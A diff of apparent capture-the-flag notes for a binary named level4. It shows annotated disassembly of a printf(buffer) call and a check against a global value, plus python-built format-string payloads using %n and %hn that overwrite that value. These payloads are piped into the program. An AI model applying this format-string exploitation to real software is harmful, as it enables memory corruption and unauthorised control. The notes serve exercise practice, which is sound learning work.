@@ -1,4 +1,4 @@
-p:
+	p:
 0x08048444 <+0>:	push   %ebp
 0x08048445 <+1>:	mov    %esp,%ebp
 0x08048447 <+3>:	sub    $0x18,%esp ; 24
@@ -23,8 +23,7 @@ n:
 0x0804847f <+40>:	lea    -0x208(%ebp),%eax ; eax = buffer
 0x08048485 <+46>:	mov    %eax,(%esp) ; esp = buffer
 
-@0x08048488 <+49>:	call   0x8048444 <p>
-printf(buffer)
+@0x08048488 <+49>:	call   0x8048444 <p> ; printf(buffer)
 0x0804848d <+54>:	mov    0x8049810,%eax
 0x08048492 <+59>:	cmp    $0x01025544,%eax
 0x08048497 <+64>:	jne    0x80484a5 <n+78>
@@ -49,4 +48,5 @@ adresse de check : 0x8049810
 
 gdb /home/user/level4/level4 -ex "set args < <(python -c \"print '\x12''\x98''\x04''\x08' + 'aaaa' + '\x10''\x98''\x04''\x08' + '%08x.' * 10 + '%0156x' + '%n' + '%021570x' + '%hn'\")"
 
-gdb /home/user/level4/level4 -ex "set args < <(python -c \"print '\x10''\x98''\x04''\x08' + '%08x.' * 10 + '%01430520227x' + '%n'")"
+cat <(python -c "print '\x12\x98\x04\x08' + 'aaaa' + '\x10\x98\x04\x08' + '%08x.' * 10 + '%0156x' + '%n' + '%021570x' + '%hn'") - | ./level4
+
